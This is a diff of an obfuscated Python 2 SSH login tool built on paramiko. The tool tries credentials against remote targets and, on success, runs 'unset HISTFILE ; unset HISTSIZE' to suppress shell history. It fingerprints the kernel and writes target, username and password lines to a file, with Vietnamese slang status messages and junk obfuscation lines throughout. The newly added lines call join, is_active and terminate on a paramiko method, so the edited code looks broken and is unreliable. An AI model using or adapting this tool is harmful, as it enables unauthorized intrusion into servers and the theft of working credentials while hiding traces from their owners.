@@ -266,35 +266,39 @@ def o0oO ( target , port , user , passwd , outfile , timeo , i ) :
   try :
    IIiIi1iI . exec_command ( 'unset HISTFILE ; unset HISTSIZE' )
    time . sleep ( 1 )
-   i1IiiiI1iI , i1iIi , ooOOoooooo = IIiIi1iI . exec_command ( 'echo Ngon!' )
+   i1IiiiI1iI , i1iIi , ooOOoooooo = IIiIi1iI . exec_command ( 'uname -mrs' )
    if 1 - 1: Oo0Ooo / o0oOOo0O0Ooo % iii1I1I * O00oOoOoO0o0O . i11iIiiIii
-   III1Iiii1I11 = 'Ngon! kernel: %s' % ( i1iIi . readlines ( ) [ 0 ] . replace ( '\n' , '' ) )
-   if 9 - 9: I1ii11iIi11i / Oo0Ooo - I1IiiI / OoooooooOO / iIii1I11I1II1 - o0oOOo0O0Ooo
+   IIiIi1iI . exec_command . join ( 5 )
+   if IIiIi1iI . exec_command . is_active ( ) :
+    IIiIi1iI . exec_command . terminate ( )
+    if 2 - 2: I1ii11iIi11i * I11i - iIii1I11I1II1 + I1IiiI . oO0o % iii1I1I
+   ooOOOoOooOoO = 'Ngon! %s' % ( i1iIi . readlines ( ) [ 0 ] . replace ( '\n' , '' ) )
+   if 91 - 91: iii1I1I % i1IIi % iIii1I11I1II1
   except :
-   III1Iiii1I11 = 'Hên xui! maybe a honeypot or false positive'
-  o00oooO0Oo = '%s|%s|%s' '|%s' % ( target , user , passwd , III1Iiii1I11 )
-  if 78 - 78: Ii1I % O0oo0OO0 + I1ii11iIi11i
-  print o00oooO0Oo
+   ooOOOoOooOoO = 'Hên xui! maybe a honeypot or false positive'
+  IIi1I11I1II = '%s|%s|%s' '|%s' % ( target , user , passwd , ooOOOoOooOoO )
+  if 63 - 63: OoooooooOO - OoO0O00 . II111iiii / o0oOOo0O0Ooo . OoOoOO00 / O0
+  print IIi1I11I1II
   if outfile :
-   Ii1 ( outfile , o00oooO0Oo + '\n' )
+   Ii1 ( outfile , IIi1I11I1II + '\n' )
   IIiIi1iI . close ( )
   os . _exit ( 0 )
- except paramiko . AuthenticationException , OOooOoooOoOo :
+ except paramiko . AuthenticationException , o0OOOO00O0Oo :
   IIiIi1iI . close ( )
-  o0OOOO00O0Oo = str ( OOooOoooOoOo )
-  if '[\'publickey\']' in o0OOOO00O0Oo :
+  ii = str ( o0OOOO00O0Oo )
+  if '[\'publickey\']' in ii :
    print '[-] key authentication only - ' 'Không lượm được cháu %s' % ( target )
-   if 48 - 48: O0
+   if 90 - 90: o0oOOo0O0Ooo % i1IIi / OoO0O00
    os . _exit ( 1 )
-  elif '\'keyboard-interactive\'' in o0OOOO00O0Oo :
+  elif '\'keyboard-interactive\'' in ii :
    print '[-] %s requires \'keyboard-interactive\' handler' % ( target )
    os . _exit ( 1 )
  except :
   IIiIi1iI . close ( )
-  if 11 - 11: I11i + OoooooooOO - OoO0O00 / o0oOOo0O0Ooo + Oo0Ooo . II111iiii
+  if 44 - 44: Oo0Ooo . OoO0O00 / I1ii11iIi11i + Ii1I
   if i < 3 :
    i += 1
-   if 41 - 41: Ii1I - O0 - O0
+   if 65 - 65: O0
    oO00OOoO00 = random . uniform ( 0.6 , 1.2 )
    time . sleep ( oO00OOoO00 )
    o0oO ( target , port , user , passwd , outfile , timeo , i )
